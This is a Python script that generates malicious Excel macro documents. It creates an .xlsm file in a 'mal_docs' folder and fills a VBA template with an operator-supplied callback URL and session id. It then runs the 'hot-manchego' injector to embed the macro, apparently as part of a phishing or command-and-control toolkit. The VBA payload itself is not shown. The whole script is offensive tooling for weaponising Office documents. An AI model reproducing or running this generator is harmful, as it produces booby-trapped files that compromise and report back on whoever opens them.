import re
import subprocess
import os
import argparse
cwd = os.path.realpath(__file__+'\\..\\').split(":")[1]



def insert_macro(filename,vba_file):
    output= subprocess.run([cwd+'\\hot_manchego\\hot-manchego.exe', f'\\..\\python_backend\\mal_docs\\{filename}',f'\\..\\python_backend\\hot_manchego\\{vba_file}'])
    print("[+] Excel Document generated ")

    
def create_xlsm_file(out_name):
    file = open(f'{cwd}\\mal_docs\\{out_name}.xlsm','w')
    file.close()

def create_vba(sessionid,url):
    vba_file= open(cwd+'\\hot_manchego\\vba.txt','r')
    vba_content = vba_file.read()
    vba_file.close()

    vba_content=re.sub('ip-here',url,vba_content)
    vba_content=re.sub('session-here',sessionid,vba_content)

    vba_file_name="vba_for_user.txt"
    new_vba_file=open(cwd+'\\hot_manchego\\'+vba_file_name,'w')
    new_vba_file.write(vba_content)
    new_vba_file.close()

    return vba_file_name

if __name__=='__main__':
    print("[+] Script started")
    parser = argparse.ArgumentParser()
    parser.add_argument('--file',help='enter the name of generated macro file')
    parser.add_argument('--sessionid',help="enter session id going wiht url")
    parser.add_argument('--url',help=" Enter url to ping to server")
    args =parser.parse_args()

    create_xlsm_file(args.file)
    vba_file = create_vba(args.sessionid, args.url)
    insert_macro(f'{args.file}.xlsm',vba_file)
